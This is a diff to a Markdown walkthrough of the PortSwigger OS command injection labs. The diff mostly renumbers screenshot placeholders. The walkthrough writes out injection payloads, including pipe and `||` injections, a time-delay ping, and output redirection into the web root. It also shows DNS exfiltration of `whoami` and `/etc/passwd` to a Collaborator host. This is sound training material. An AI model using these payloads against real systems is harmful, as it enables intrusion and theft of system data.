@@ -42,14 +42,18 @@ The stock-check feature passes the `storeID` into a shell command. Inject direct
 storeID=1|whoami
 ```
 
-The pipe runs `whoami` and the current username appears in the stock-level response.
-
-> **Picture goes here (#2).** `storeID=1|whoami` request with the username in the response.
+> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `storeID=1|whoami`.
 > _Save as_ `images/portswigger-os-command-injection-labs/2.png` _then replace this block with_ `![Lab 1 — OS command injection, simple case](/images/portswigger-os-command-injection-labs/2.png)`_._
 
+
+The pipe runs `whoami` and the current username appears in the stock-level response.
+
+> **Picture goes here (#3).** `storeID=1|whoami` request with the username in the response.
+> _Save as_ `images/portswigger-os-command-injection-labs/3.png` _then replace this block with_ `![Lab 1 — OS command injection, simple case](/images/portswigger-os-command-injection-labs/3.png)`_._
+
 ## Lab 2 — Blind OS command injection with time delays
-> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=x||ping+-c+10+127.0.0.1||`.
-> _Save as_ `images/portswigger-os-command-injection-labs/3.png` _then replace this block with_ `![Lab 2 — Blind OS command injection with time delays](/images/portswigger-os-command-injection-labs/3.png)`_._
+> **Picture goes here (#4).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=x||ping+-c+10+127.0.0.1||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/4.png` _then replace this block with_ `![Lab 2 — Blind OS command injection with time delays](/images/portswigger-os-command-injection-labs/4.png)`_._
 
 
 **Difficulty:** Apprentice
@@ -61,18 +65,22 @@ The feedback form passes the `email` parameter to a shell command. There is no o
 email=x||ping+-c+10+127.0.0.1||
 ```
 
+> **Picture goes here (#5).** Capture this request/response or command step in Burp/terminal. Key line: `email=x||ping+-c+10+127.0.0.1||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/5.png` _then replace this block with_ `![Lab 2 — Blind OS command injection with time delays](/images/portswigger-os-command-injection-labs/5.png)`_._
+
+
 (URL-encoded: the spaces are `+`.) The response now takes about 10 seconds — confirming the command ran.
 
 > **Why `||`:** the original command likely fails because `x` is not a valid argument, so the `||` branch executes our `ping`.
 
 Other delay primitives: `sleep 10` (Linux), `timeout 10` / `ping -n 10 127.0.0.1` (Windows), `sleep 10 &` to background it.
 
-> **Picture goes here (#4).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/portswigger-os-command-injection-labs/4.png` _then replace this block with_ `![Lab 2 — Blind OS command injection with time delays](/images/portswigger-os-command-injection-labs/4.png)`_._
+> **Picture goes here (#6).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-os-command-injection-labs/6.png` _then replace this block with_ `![Lab 2 — Blind OS command injection with time delays](/images/portswigger-os-command-injection-labs/6.png)`_._
 
 ## Lab 3 — Blind OS command injection with output redirection
-> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=||whoami>/var/www/images/output.txt||`.
-> _Save as_ `images/portswigger-os-command-injection-labs/5.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/5.png)`_._
+> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=||whoami>/var/www/images/output.txt||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/7.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/7.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -86,20 +94,28 @@ We redirect the command's output into a file inside the web root, then fetch tha
 email=||whoami>/var/www/images/output.txt||
 ```
 
+> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `email=||whoami>/var/www/images/output.txt||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/8.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/8.png)`_._
+
+
 **Step 2** — load a product image, but swap the filename for the file we created:
 
 ```text
 filename=output.txt
 ```
 
+> **Picture goes here (#9).** Capture this request/response or command step in Burp/terminal. Key line: `filename=output.txt`.
+> _Save as_ `images/portswigger-os-command-injection-labs/9.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/9.png)`_._
+
+
 **Step 3** — the image request now returns the file contents, i.e. the `whoami` output.
 
-> **Picture goes here (#6).** The `filename=output.txt` request returning the redirected command output.
-> _Save as_ `images/portswigger-os-command-injection-labs/6.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/6.png)`_._
+> **Picture goes here (#10).** The `filename=output.txt` request returning the redirected command output.
+> _Save as_ `images/portswigger-os-command-injection-labs/10.png` _then replace this block with_ `![Lab 3 — Blind OS command injection with output redirection](/images/portswigger-os-command-injection-labs/10.png)`_._
 
 ## Lab 4 — Blind OS command injection with out-of-band interaction
-> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`.
-> _Save as_ `images/portswigger-os-command-injection-labs/7.png` _then replace this block with_ `![Lab 4 — Blind OS command injection with out-of-band interaction](/images/portswigger-os-command-injection-labs/7.png)`_._
+> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/11.png` _then replace this block with_ `![Lab 4 — Blind OS command injection with out-of-band interaction](/images/portswigger-os-command-injection-labs/11.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -111,16 +127,20 @@ The command is executed **asynchronously** and does not affect the response at a
 email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
 ```
 
+> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/12.png` _then replace this block with_ `![Lab 4 — Blind OS command injection with out-of-band interaction](/images/portswigger-os-command-injection-labs/12.png)`_._
+
+
 In Burp, select the placeholder and choose **Insert Collaborator payload**, send the request, then poll Collaborator for a DNS/HTTP interaction.
 
 > **Using Community Edition:** Collaborator requires Burp Professional. A self-hosted OAST server such as `interactsh` or a `canarytokens.org` token works the same way — substitute its hostname.
 
-> **Picture goes here (#8).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
-> _Save as_ `images/portswigger-os-command-injection-labs/8.png` _then replace this block with_ `![Lab 4 — Blind OS command injection with out-of-band interaction](/images/portswigger-os-command-injection-labs/8.png)`_._
+> **Picture goes here (#13).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
+> _Save as_ `images/portswigger-os-command-injection-labs/13.png` _then replace this block with_ `![Lab 4 — Blind OS command injection with out-of-band interaction](/images/portswigger-os-command-injection-labs/13.png)`_._
 
 ## Lab 5 — Blind OS command injection with out-of-band data exfiltration
-> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `whoami`.
-> _Save as_ `images/portswigger-os-command-injection-labs/9.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/9.png)`_._
+> **Picture goes here (#14).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `whoami`.
+> _Save as_ `images/portswigger-os-command-injection-labs/14.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/14.png)`_._
 
 
 **Difficulty:** Practitioner
@@ -132,14 +152,22 @@ Same OAST technique, but now we embed command output in the looked-up hostname u
 email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
 ```
 
+> **Picture goes here (#15).** Capture this request/response or command step in Burp/terminal. Key line: `email=||nslookup+whoami.BURP-COLLABORATOR-SUBDOMAIN||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/15.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/15.png)`_._
+
+
 Poll Collaborator; the DNS interaction's subdomain contains the username. To read a file, replace `whoami` with `cat /etc/passwd` or similar:
 
 ```text
 email=||nslookup+`cat+/etc/passwd`.BURP-COLLABORATOR-SUBDOMAIN||
 ```
 
-> **Picture goes here (#10).** Collaborator interaction where the subdomain holds the exfiltrated output.
-> _Save as_ `images/portswigger-os-command-injection-labs/10.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/10.png)`_._
+> **Picture goes here (#16).** Capture this request/response or command step in Burp/terminal. Key line: `email=||nslookup+cat+/etc/passwd.BURP-COLLABORATOR-SUBDOMAIN||`.
+> _Save as_ `images/portswigger-os-command-injection-labs/16.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/16.png)`_._
+
+
+> **Picture goes here (#17).** Collaborator interaction where the subdomain holds the exfiltrated output.
+> _Save as_ `images/portswigger-os-command-injection-labs/17.png` _then replace this block with_ `![Lab 5 — Blind OS command injection with out-of-band data exfiltration](/images/portswigger-os-command-injection-labs/17.png)`_._
 
 ## Cheat sheet
 
